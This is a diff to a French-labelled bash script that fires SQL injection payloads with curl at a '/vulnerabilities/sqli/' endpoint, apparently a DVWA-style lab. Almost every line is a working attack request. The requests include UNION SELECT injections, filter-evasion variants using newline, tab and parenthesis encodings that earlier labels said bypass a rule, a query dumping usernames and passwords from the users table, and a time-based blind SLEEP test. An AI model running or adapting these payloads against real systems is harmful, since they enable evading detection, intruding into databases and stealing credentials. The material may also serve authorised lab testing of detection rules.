@@ -13,19 +13,19 @@ curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'='1
 echo "[2] UNION SELECT classique (detectable)"
 curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,database()--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"
 
-echo "[3] EVASION newline %0a (bypasse leur regle)"
+echo "[3] EVASION newline %0a"
 curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION%0aSELECT+1,database()--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"
 
-echo "[4] EVASION tab %09 (bypasse leur regle)"
+echo "[4] EVASION tab %09"
 curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION%09SELECT+1,database()--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"
 
-echo "[5] EVASION parentheses (bypasse leur regle)"
+echo "[5] EVASION parentheses"
 curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION(SELECT+1,database())--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"
 
-echo "[6] EVASION dump passwords via newline"
+echo "[6] Dump passwords via newline"
 curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION%0aSELECT+user,password+FROM+users--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"
 
-echo "[7] Time-based blind (discret)"
+echo "[7] Time-based blind SLEEP(3)"
 curl -s -b "$COOKIE" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+AND+SLEEP(3)--+-&Submit=Submit" -o /dev/null -w "    HTTP %{http_code}\n"
 
 echo ""
